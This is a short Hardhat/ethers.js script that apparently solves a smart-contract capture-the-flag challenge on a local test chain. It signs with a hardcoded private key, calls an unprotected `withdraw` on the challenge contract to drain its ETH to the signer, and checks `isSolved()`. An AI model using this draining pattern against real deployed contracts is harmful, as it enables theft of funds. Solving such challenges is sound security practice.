const { ethers } = require('hardhat')

const jsonRpcUrl = 'http://127.0.0.1:8545'
const setupAddress = '0x8A791620dd6260079BF849Dc5567aDC3F2FdC318'
const challengeAddress = '0x8aCd85898458400f7Db866d53FCFF6f0D49741FF'
const signerPrivateKey = '0xedbc6d1a8360d0c02d4063cdd0a23b55c469c90d3cfbc2c88a015f9dd92d22b3'

const fetchBalance = async contractOrSigner => {
   const balance = await contractOrSigner.provider.getBalance(contractOrSigner.address)
   return `address: ${contractOrSigner.address}, balance: ${ethers.utils.formatEther(balance)}`
}

const printBalances = async (title, first, second) => {
   console.log(title)
   console.group()
   console.log(await fetchBalance(first))
   console.log(await fetchBalance(second))
   console.groupEnd()
}

async function main() {

   // Connect to the given blockchain
   const provider = new ethers.providers.JsonRpcProvider(jsonRpcUrl)

   // The signer is the given EOA which we need to use to sign any transaction
   // needed to perform the attack (because it has the ETH to pay for fees).
   const signer = new ethers.Wallet(signerPrivateKey, provider)

   // Initialize the contract instance to interact with the Challenge contract.
   const challengeInstance = (await ethers.getContractAt('Challenge', challengeAddress)).connect(signer)

   // Perform the attack, simply call the unprotected `withdraw` function.
   await printBalances('Before', signer, challengeInstance)
   await challengeInstance.withdraw(signer.address)
   await printBalances('After', signer, challengeInstance)

   // Call the `isSolved` function of the Setup contract
   const setupInstance = (await ethers.getContractAt('Setup', setupAddress)).connect(signer)
   console.log('Is solved:', await setupInstance.isSolved())
}

main()
   .catch(error => {
      console.error(error)
      process.exitCode = 1
   })
